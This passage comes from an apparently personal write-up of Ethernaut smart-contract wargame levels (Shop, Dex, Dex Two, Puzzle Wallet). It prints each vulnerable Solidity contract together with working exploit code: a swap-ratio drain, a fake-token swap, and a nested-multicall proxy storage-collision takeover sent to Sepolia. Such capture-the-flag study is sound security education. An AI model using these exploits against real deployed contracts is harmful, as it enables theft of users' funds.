</span><span>      isSold </span><span style=color:#81a1c1>= true</span><span>;
</span><span>      price </span><span style=color:#81a1c1>=</span><span> _buyer.</span><span style=color:#88c0d0>price</span><span>();
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><p>Just like the previous level <a href=/blog/ethernaut/#Elevator>Elevator</a>. but at this time the interface was set to <code>view</code>, which means couldn’t change the state of contract like we do at Elevator.<p>but we could re-call the shop contract to construct two diffenrent returns value. (since the isSold variable was set to be public, its easy to do that)<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8</span><span>;
</span><span>
</span><span>import "./chall/Shop.sol";
</span><span>
</span><span>contract </span><span style=color:#88c0d0>exp </span><span>{
</span><span>    Shop levelInstance;
</span><span>
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>addr) {
</span><span>        levelInstance </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>Shop</span><span>(addr);
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>price</span><span>() </span><span style=color:#81a1c1>public view </span><span>returns (</span><span style=color:#81a1c1>uint256</span><span>) {
</span><span>        return </span><span style=color:#88c0d0>Shop</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>).</span><span style=color:#88c0d0>isSold</span><span>() </span><span style=color:#81a1c1>? </span><span style=color:#b48ead>0 </span><span style=color:#81a1c1>: </span><span style=color:#b48ead>100</span><span>;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>buy</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>        levelInstance.</span><span style=color:#88c0d0>buy</span><span>();
</span><span>    }
</span><span>}
</span></code></pre><p>and I have to say that even the <code>staticcall</code> could not prevent this. staticcall prevents many bytecode instructions from being called, but even within the contract there is still state changing. Related challenges: MetaTrust CTF 2023: <a href=https://ranwen.de/posts/2023-09-17-metatrust23/#who>Who(stage1)</a>.<h2 id=dex>Dex</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
</span><span>import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
</span><span>import 'openzeppelin-contracts-08/access/Ownable.sol';
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Dex </span><span>is </span><span style=color:#88c0d0>Ownable </span><span>{
</span><span>  </span><span style=color:#81a1c1>address public</span><span> token1;
</span><span>  </span><span style=color:#81a1c1>address public</span><span> token2;
</span><span>  constructor() {}
</span><span>
</span><span>  function </span><span style=color:#88c0d0>setTokens</span><span>(</span><span style=color:#81a1c1>address </span><span>_token1, </span><span style=color:#81a1c1>address </span><span>_token2) </span><span style=color:#81a1c1>public onlyOwner </span><span>{
</span><span>    token1 </span><span style=color:#81a1c1>=</span><span> _token1;
</span><span>    token2 </span><span style=color:#81a1c1>=</span><span> _token2;
</span><span>  }
</span><span>  
</span><span>  function </span><span style=color:#88c0d0>addLiquidity</span><span>(</span><span style=color:#81a1c1>address </span><span>token_address, </span><span style=color:#81a1c1>uint </span><span>amount) </span><span style=color:#81a1c1>public onlyOwner </span><span>{
</span><span>    </span><span style=color:#81a1c1>IERC20</span><span>(token_address).</span><span style=color:#88c0d0>transferFrom</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, </span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>), amount);
</span><span>  }
</span><span>  
</span><span>  function </span><span style=color:#88c0d0>swap</span><span>(</span><span style=color:#81a1c1>address </span><span>from, </span><span style=color:#81a1c1>address </span><span>to, </span><span style=color:#81a1c1>uint </span><span>amount) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    require((from </span><span style=color:#81a1c1>==</span><span> token1 </span><span style=color:#81a1c1>&&</span><span> to </span><span style=color:#81a1c1>==</span><span> token2) </span><span style=color:#81a1c1>|| </span><span>(from </span><span style=color:#81a1c1>==</span><span> token2 </span><span style=color:#81a1c1>&&</span><span> to </span><span style=color:#81a1c1>==</span><span> token1), "Invalid tokens");
</span><span>    require(</span><span style=color:#81a1c1>IERC20</span><span>(from).</span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>) </span><span style=color:#81a1c1>>=</span><span> amount, "Not enough to swap");
</span><span>    </span><span style=color:#81a1c1>uint</span><span> swapAmount </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>getSwapPrice</span><span>(from, to, amount);
</span><span>    </span><span style=color:#81a1c1>IERC20</span><span>(from).</span><span style=color:#88c0d0>transferFrom</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, </span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>), amount);
</span><span>    </span><span style=color:#81a1c1>IERC20</span><span>(to).</span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>), swapAmount);
</span><span>    </span><span style=color:#81a1c1>IERC20</span><span>(to).</span><span style=color:#88c0d0>transferFrom</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>), </span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, swapAmount);
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>getSwapPrice</span><span>(</span><span style=color:#81a1c1>address </span><span>from, </span><span style=color:#81a1c1>address </span><span>to, </span><span style=color:#81a1c1>uint </span><span>amount) </span><span style=color:#81a1c1>public view </span><span>returns(</span><span style=color:#81a1c1>uint</span><span>){
</span><span>    return((amount </span><span style=color:#81a1c1>* IERC20</span><span>(to).</span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>)))</span><span style=color:#81a1c1>/IERC20</span><span>(from).</span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>)));
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>address </span><span>spender, </span><span style=color:#81a1c1>uint </span><span>amount) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    </span><span style=color:#88c0d0>SwappableToken</span><span>(token1).</span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, spender, amount);
</span><span>    </span><span style=color:#88c0d0>SwappableToken</span><span>(token2).</span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, spender, amount);
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>address </span><span>token, </span><span style=color:#81a1c1>address </span><span>account) </span><span style=color:#81a1c1>public view </span><span>returns (</span><span style=color:#81a1c1>uint</span><span>){
</span><span>    return </span><span style=color:#81a1c1>IERC20</span><span>(token).</span><span style=color:#88c0d0>balanceOf</span><span>(account);
</span><span>  }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>SwappableToken </span><span>is </span><span style=color:#81a1c1>ERC20 </span><span>{
</span><span>  </span><span style=color:#81a1c1>address private</span><span> _dex;
</span><span>  constructor(</span><span style=color:#81a1c1>address </span><span>dexInstance, </span><span style=color:#81a1c1>string memory </span><span>name, </span><span style=color:#81a1c1>string memory </span><span>symbol, </span><span style=color:#81a1c1>uint256 </span><span>initialSupply) </span><span style=color:#88c0d0>ERC20</span><span>(name, symbol) {
</span><span>        </span><span style=color:#88c0d0>_mint</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, initialSupply);
</span><span>        _dex </span><span style=color:#81a1c1>=</span><span> dexInstance;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>address </span><span>owner, </span><span style=color:#81a1c1>address </span><span>spender, </span><span style=color:#81a1c1>uint256 </span><span>amount) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    require(owner </span><span style=color:#81a1c1>!=</span><span> _dex, "InvalidApprover");
</span><span>    </span><span style=color:#81a1c1>super</span><span>.</span><span style=color:#88c0d0>_approve</span><span>(owner, spender, amount);
</span><span>  }
</span><span>}
</span></code></pre><p>logical vulnerability. The calculation logic of the function <code>getSwapPrice</code> allows us to get more tokens by converting between two tokens<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span>let token1 </span><span style=color:#81a1c1>=</span><span> await contract.</span><span style=color:#88c0d0>token1</span><span>();
</span><span>let token2 </span><span style=color:#81a1c1>=</span><span> await contract.</span><span style=color:#88c0d0>token2</span><span>();
</span><span>await contract.approve(instance, </span><span style=color:#b48ead>1000</span><span>);
</span><span>await contract.swap(token1, token2, </span><span style=color:#b48ead>10</span><span>);
</span><span>await contract.swap(token2, token1, </span><span style=color:#b48ead>20</span><span>);
</span><span>await contract.swap(token1, token2, </span><span style=color:#b48ead>24</span><span>);
</span><span>await contract.swap(token2, token1, </span><span style=color:#b48ead>30</span><span>);
</span><span>await contract.swap(token1, token2, </span><span style=color:#b48ead>41</span><span>);
</span><span>await contract.swap(token2, token1, </span><span style=color:#b48ead>45</span><span>); 
</span><span>
</span><span>await contract.balanceOf(token1, instance);
</span><span>await contract.balanceOf(token2, instance);
</span></code></pre><h2 id=dex-two>Dex Two</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
</span><span>import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
</span><span>import 'openzeppelin-contracts-08/access/Ownable.sol';
</span><span>
</span><span>contract </span><span style=color:#88c0d0>DexTwo </span><span>is </span><span style=color:#88c0d0>Ownable </span><span>{
</span><span>  </span><span style=color:#81a1c1>address public</span><span> token1;
</span><span>  </span><span style=color:#81a1c1>address public</span><span> token2;
</span><span>  constructor() {}
</span><span>
</span><span>  function </span><span style=color:#88c0d0>setTokens</span><span>(</span><span style=color:#81a1c1>address </span><span>_token1, </span><span style=color:#81a1c1>address </span><span>_token2) </span><span style=color:#81a1c1>public onlyOwner </span><span>{
</span><span>    token1 </span><span style=color:#81a1c1>=</span><span> _token1;
</span><span>    token2 </span><span style=color:#81a1c1>=</span><span> _token2;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>add_liquidity</span><span>(</span><span style=color:#81a1c1>address </span><span>token_address, </span><span style=color:#81a1c1>uint </span><span>amount) </span><span style=color:#81a1c1>public onlyOwner </span><span>{
</span><span>    </span><span style=color:#81a1c1>IERC20</span><span>(token_address).</span><span style=color:#88c0d0>transferFrom</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, </span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>), amount);
</span><span>  }
</span><span>  
</span><span>  function </span><span style=color:#88c0d0>swap</span><span>(</span><span style=color:#81a1c1>address </span><span>from, </span><span style=color:#81a1c1>address </span><span>to, </span><span style=color:#81a1c1>uint </span><span>amount) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    require(</span><span style=color:#81a1c1>IERC20</span><span>(from).</span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>) </span><span style=color:#81a1c1>>=</span><span> amount, "Not enough to swap");
</span><span>    </span><span style=color:#81a1c1>uint</span><span> swapAmount </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>getSwapAmount</span><span>(from, to, amount);
</span><span>    </span><span style=color:#81a1c1>IERC20</span><span>(from).</span><span style=color:#88c0d0>transferFrom</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, </span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>), amount);
</span><span>    </span><span style=color:#81a1c1>IERC20</span><span>(to).</span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>), swapAmount);
</span><span>    </span><span style=color:#81a1c1>IERC20</span><span>(to).</span><span style=color:#88c0d0>transferFrom</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>), </span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, swapAmount);
</span><span>  } 
</span><span>
</span><span>  function </span><span style=color:#88c0d0>getSwapAmount</span><span>(</span><span style=color:#81a1c1>address </span><span>from, </span><span style=color:#81a1c1>address </span><span>to, </span><span style=color:#81a1c1>uint </span><span>amount) </span><span style=color:#81a1c1>public view </span><span>returns(</span><span style=color:#81a1c1>uint</span><span>){
</span><span>    return((amount </span><span style=color:#81a1c1>* IERC20</span><span>(to).</span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>)))</span><span style=color:#81a1c1>/IERC20</span><span>(from).</span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>)));
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>address </span><span>spender, </span><span style=color:#81a1c1>uint </span><span>amount) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    </span><span style=color:#88c0d0>SwappableTokenTwo</span><span>(token1).</span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, spender, amount);
</span><span>    </span><span style=color:#88c0d0>SwappableTokenTwo</span><span>(token2).</span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, spender, amount);
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>address </span><span>token, </span><span style=color:#81a1c1>address </span><span>account) </span><span style=color:#81a1c1>public view </span><span>returns (</span><span style=color:#81a1c1>uint</span><span>){
</span><span>    return </span><span style=color:#81a1c1>IERC20</span><span>(token).</span><span style=color:#88c0d0>balanceOf</span><span>(account);
</span><span>  }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>SwappableTokenTwo </span><span>is </span><span style=color:#81a1c1>ERC20 </span><span>{
</span><span>  </span><span style=color:#81a1c1>address private</span><span> _dex;
</span><span>  constructor(</span><span style=color:#81a1c1>address </span><span>dexInstance, </span><span style=color:#81a1c1>string memory </span><span>name, </span><span style=color:#81a1c1>string memory </span><span>symbol, </span><span style=color:#81a1c1>uint </span><span>initialSupply) </span><span style=color:#88c0d0>ERC20</span><span>(name, symbol) {
</span><span>        </span><span style=color:#88c0d0>_mint</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, initialSupply);
</span><span>        _dex </span><span style=color:#81a1c1>=</span><span> dexInstance;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>address </span><span>owner, </span><span style=color:#81a1c1>address </span><span>spender, </span><span style=color:#81a1c1>uint256 </span><span>amount) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    require(owner </span><span style=color:#81a1c1>!=</span><span> _dex, "InvalidApprover");
</span><span>    </span><span style=color:#81a1c1>super</span><span>.</span><span style=color:#88c0d0>_approve</span><span>(owner, spender, amount);
</span><span>  }
</span><span>}
</span></code></pre><p>Only swap function have modified a little. thats mean we could specify a evil contract address to swap the real token.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>exp </span><span>{
</span><span>    function </span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#81a1c1>address </span><span>spender, </span><span style=color:#81a1c1>uint256 </span><span>value) </span><span style=color:#81a1c1>external </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>        return </span><span style=color:#81a1c1>true</span><span>;
</span><span>    }
</span><span>    function </span><span style=color:#88c0d0>transferFrom</span><span>(</span><span style=color:#81a1c1>address </span><span>from, </span><span style=color:#81a1c1>address </span><span>to, </span><span style=color:#81a1c1>uint256 </span><span>value) </span><span style=color:#81a1c1>external </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>        return </span><span style=color:#81a1c1>true</span><span>;
</span><span>    }
</span><span>    function </span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>address </span><span>account) </span><span style=color:#81a1c1>external view </span><span>returns (</span><span style=color:#81a1c1>uint256</span><span>) {
</span><span>        return </span><span style=color:#81a1c1>uint256</span><span>(</span><span style=color:#b48ead>10</span><span>);
</span><span>    }
</span><span>    function </span><span style=color:#88c0d0>receive</span><span>() </span><span style=color:#81a1c1>external payable </span><span>{ }
</span><span>}
</span></code></pre><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span>let token1 </span><span style=color:#81a1c1>=</span><span> await contract.</span><span style=color:#88c0d0>token1</span><span>();
</span><span>let token2 </span><span style=color:#81a1c1>=</span><span> await contract.</span><span style=color:#88c0d0>token2</span><span>();
</span><span>let exp </span><span style=color:#81a1c1>= </span><span>'0x3327f08D1BaA8076C5f185DE898667fdF7D2D96F';
</span><span>await contract.swap(exp, token1, </span><span style=color:#b48ead>10</span><span>);
</span><span>await contract.swap(exp, token2, </span><span style=color:#b48ead>10</span><span>);
</span></code></pre><h2 id=puzzle-wallet>Puzzle Wallet</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span style=color:#81a1c1>pragma experimental</span><span> ABIEncoderV2;
</span><span>
</span><span>import "../helpers/UpgradeableProxy-08.sol";
</span><span>
</span><span>contract </span><span style=color:#88c0d0>PuzzleProxy </span><span>is </span><span style=color:#88c0d0>UpgradeableProxy </span><span>{
</span><span>    </span><span style=color:#81a1c1>address public</span><span> pendingAdmin;
</span><span>    </span><span style=color:#81a1c1>address public</span><span> admin;
</span><span>
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>_admin, </span><span style=color:#81a1c1>address </span><span>_implementation, </span><span style=color:#81a1c1>bytes memory </span><span>_initData) </span><span style=color:#88c0d0>UpgradeableProxy</span><span>(_implementation, _initData) {
</span><span>        admin </span><span style=color:#81a1c1>=</span><span> _admin;
</span><span>    }
</span><span>
</span><span>    modifier </span><span style=color:#88c0d0>onlyAdmin </span><span>{
</span><span>      require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender ==</span><span> admin, "Caller is not the admin");
</span><span>      _;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>proposeNewAdmin</span><span>(</span><span style=color:#81a1c1>address </span><span>_newAdmin) </span><span style=color:#81a1c1>external </span><span>{
</span><span>        pendingAdmin </span><span style=color:#81a1c1>=</span><span> _newAdmin;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>approveNewAdmin</span><span>(</span><span style=color:#81a1c1>address </span><span>_expectedAdmin) </span><span style=color:#81a1c1>external onlyAdmin </span><span>{
</span><span>        require(pendingAdmin </span><span style=color:#81a1c1>==</span><span> _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
</span><span>        admin </span><span style=color:#81a1c1>=</span><span> pendingAdmin;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>upgradeTo</span><span>(</span><span style=color:#81a1c1>address </span><span>_newImplementation) </span><span style=color:#81a1c1>external onlyAdmin </span><span>{
</span><span>        </span><span style=color:#88c0d0>_upgradeTo</span><span>(_newImplementation);
</span><span>    }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>PuzzleWallet </span><span>{
</span><span>    </span><span style=color:#81a1c1>address public</span><span> owner;
</span><span>    </span><span style=color:#81a1c1>uint256 public</span><span> maxBalance;
</span><span>    mapping(</span><span style=color:#81a1c1>address </span><span>=> </span><span style=color:#81a1c1>bool</span><span>) </span><span style=color:#81a1c1>public</span><span> whitelisted;
</span><span>    mapping(</span><span style=color:#81a1c1>address </span><span>=> </span><span style=color:#81a1c1>uint256</span><span>) </span><span style=color:#81a1c1>public</span><span> balances;
</span><span>
</span><span>    function </span><span style=color:#88c0d0>init</span><span>(</span><span style=color:#81a1c1>uint256 </span><span>_maxBalance) </span><span style=color:#81a1c1>public </span><span>{
</span><span>        require(maxBalance </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>0</span><span>, "Already initialized");
</span><span>        maxBalance </span><span style=color:#81a1c1>=</span><span> _maxBalance;
</span><span>        owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>    }
</span><span>
</span><span>    modifier </span><span style=color:#88c0d0>onlyWhitelisted </span><span>{
</span><span>        require(whitelisted[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>], "Not whitelisted");
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>setMaxBalance</span><span>(</span><span style=color:#81a1c1>uint256 </span><span>_maxBalance) </span><span style=color:#81a1c1>external onlyWhitelisted </span><span>{
</span><span>      require(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>).balance </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>0</span><span>, "Contract balance is not 0");
</span><span>      maxBalance </span><span style=color:#81a1c1>=</span><span> _maxBalance;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>addToWhitelist</span><span>(</span><span style=color:#81a1c1>address </span><span>addr) </span><span style=color:#81a1c1>external </span><span>{
</span><span>        require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender ==</span><span> owner, "Not the owner");
</span><span>        whitelisted[addr] </span><span style=color:#81a1c1>= true</span><span>;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>deposit</span><span>() </span><span style=color:#81a1c1>external payable onlyWhitelisted </span><span>{
</span><span>      require(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>).balance </span><span style=color:#81a1c1><=</span><span> maxBalance, "Max balance reached");
</span><span>      balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>+= msg</span><span>.</span><span style=color:#81a1c1>value</span><span>;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>execute</span><span>(</span><span style=color:#81a1c1>address </span><span>to, </span><span style=color:#81a1c1>uint256 </span><span>value, </span><span style=color:#81a1c1>bytes calldata </span><span>data) </span><span style=color:#81a1c1>external payable onlyWhitelisted </span><span>{
</span><span>        require(balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>>=</span><span> value, "Insufficient balance");
</span><span>        balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>-=</span><span> value;
</span><span>        (</span><span style=color:#81a1c1>bool</span><span> success, ) </span><span style=color:#81a1c1>=</span><span> to.</span><span style=color:#81a1c1>call</span><span>{ value: value }(data);
</span><span>        require(success, "Execution failed");
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>multicall</span><span>(</span><span style=color:#81a1c1>bytes</span><span>[] </span><span style=color:#81a1c1>calldata </span><span>data) </span><span style=color:#81a1c1>external payable onlyWhitelisted </span><span>{
</span><span>        </span><span style=color:#81a1c1>bool</span><span> depositCalled </span><span style=color:#81a1c1>= false</span><span>;
</span><span>        for (</span><span style=color:#81a1c1>uint256</span><span> i </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0</span><span>; i </span><span style=color:#81a1c1><</span><span> data.</span><span style=color:#81a1c1>length</span><span>; i</span><span style=color:#81a1c1>++</span><span>) {
</span><span>            </span><span style=color:#81a1c1>bytes memory</span><span> _data </span><span style=color:#81a1c1>=</span><span> data[i];
</span><span>            </span><span style=color:#81a1c1>bytes4 </span><span>selector;
</span><span>            assembly {
</span><span>                selector := </span><span style=color:#88c0d0>mload</span><span>(</span><span style=color:#88c0d0>add</span><span>(_data, </span><span style=color:#b48ead>32</span><span>))
</span><span>            }
</span><span>            if (selector </span><span style=color:#81a1c1>== this</span><span>.deposit.selector) {
</span><span>                require(</span><span style=color:#81a1c1>!</span><span>depositCalled, "Deposit can only be called once");
</span><span>                </span><span style=color:#616e88>// Protect against reusing msg.value
</span><span>                depositCalled </span><span style=color:#81a1c1>= true</span><span>;
</span><span>            }
</span><span>            (</span><span style=color:#81a1c1>bool</span><span> success, ) </span><span style=color:#81a1c1>= address</span><span>(</span><span style=color:#81a1c1>this</span><span>).</span><span style=color:#81a1c1>delegatecall</span><span>(data[i]);
</span><span>            require(success, "Error while delegating call");
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><ol><li><p>The two contracts use different memory layout, means that its able to use <code>pendingAdmin</code> to override puzzleWallet’s <code>owner</code>, then add us to whiteList to allow other methods to be used.</p><li><p>Call multicall inside another multicall, to bypass the restriction of selector, and get Balance more than we exactly deposited. (reuse <code>msg.value</code>)</p><li><p>Call <code>Execute</code> to run out the balance of the contract, and use <code>setMaxBalance</code> to override the memory of PuzzleProxy’s <code>admin</code> to finish this level.</p></ol><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span>contract </span><span style=color:#88c0d0>exp </span><span>{
</span><span>    PuzzleWallet puzzleWallet;
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>_address) {
</span><span>        puzzleWallet </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>PuzzleWallet</span><span>(_address);
</span><span>    }
</span><span>    
</span><span>    function </span><span style=color:#88c0d0>attack </span><span>() </span><span style=color:#81a1c1>external payable </span><span>{
</span><span>        require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>value == </span><span style=color:#b48ead>0.001 ether</span><span>, "not enough");
</span><span>        </span><span style=color:#81a1c1>bytes</span><span>[] </span><span style=color:#81a1c1>memory</span><span> callsDeep </span><span style=color:#81a1c1>= </span><span>new </span><span style=color:#81a1c1>bytes</span><span>[](</span><span style=color:#b48ead>1</span><span>);
</span><span>        callsDeep[</span><span style=color:#b48ead>0</span><span>] </span><span style=color:#81a1c1>= abi</span><span>.</span><span style=color:#81a1c1>encodeWithSelector</span><span>(PuzzleWallet.deposit.selector);
</span><span>
</span><span>        </span><span style=color:#81a1c1>bytes</span><span>[] </span><span style=color:#81a1c1>memory</span><span> calls </span><span style=color:#81a1c1>= </span><span>new </span><span style=color:#81a1c1>bytes</span><span>[](</span><span style=color:#b48ead>2</span><span>);
</span><span>        calls[</span><span style=color:#b48ead>0</span><span>] </span><span style=color:#81a1c1>= abi</span><span>.</span><span style=color:#81a1c1>encodeWithSelector</span><span>(PuzzleWallet.deposit.selector);
</span><span>        calls[</span><span style=color:#b48ead>1</span><span>] </span><span style=color:#81a1c1>= abi</span><span>.</span><span style=color:#81a1c1>encodeWithSelector</span><span>(PuzzleWallet.multicall.selector, callsDeep);
</span><span>        puzzleWallet.</span><span style=color:#88c0d0>multicall</span><span>{value: </span><span style=color:#b48ead>0.001 ether</span><span>}(calls);
</span><span>        puzzleWallet.</span><span style=color:#88c0d0>execute</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#b48ead>0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9</span><span>), </span><span style=color:#b48ead>0.002 ether</span><span>, "");
</span><span>        puzzleWallet.</span><span style=color:#88c0d0>setMaxBalance</span><span>(</span><span style=color:#81a1c1>uint256</span><span>(</span><span style=color:#81a1c1>uint160</span><span>(</span><span style=color:#b48ead>0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9</span><span>)));
</span><span>    }
</span><span>}
</span></code></pre><pre class=language-bash data-lang=bash style=color:#d8dee9;background-color:#2e3440><code class=language-bash data-lang=bash><span style=color:#88c0d0>cast</span><span> send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 </span><span style=color:#a3be8c>"proposeNewAdmin(address)"</span><span> -r https://1rpc.io/sepolia --private-key </span><span style=color:#81a1c1>$</span><span>PRVT</span><span style=color:#81a1c1> -- </span><span style=color:#a3be8c>"0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9"
</span><span>
